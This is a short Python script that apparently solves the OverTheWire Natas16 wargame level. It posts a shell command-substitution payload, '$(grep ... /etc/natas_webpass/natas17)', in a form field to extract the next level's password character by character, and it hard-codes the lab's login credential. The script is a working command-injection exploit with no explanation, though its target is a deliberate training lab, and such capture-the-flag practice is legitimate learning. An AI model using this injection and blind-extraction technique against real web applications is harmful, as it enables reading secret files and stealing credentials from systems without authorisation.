import requests
import string
#char=string.ascii_letters+string.digits
pass_l=32
allowed_char="bhjkoqsvwCEFHJLNOT05789"
pas="EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
i=1

while True:
	for c in allowed_char:
		payload={'needle':f'$(grep {c}{pas} /etc/natas_webpass/natas17)caterpillar'}
		r=requests.post("http://natas16.natas.labs.overthewire.org/?debug=koko",auth=("natas16","hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"),data=payload)
		if "caterpillar" not in r.text:
			pas=c+pas
			print(pas + " is present")
			break
	print("all passed")
	break
		
	
			

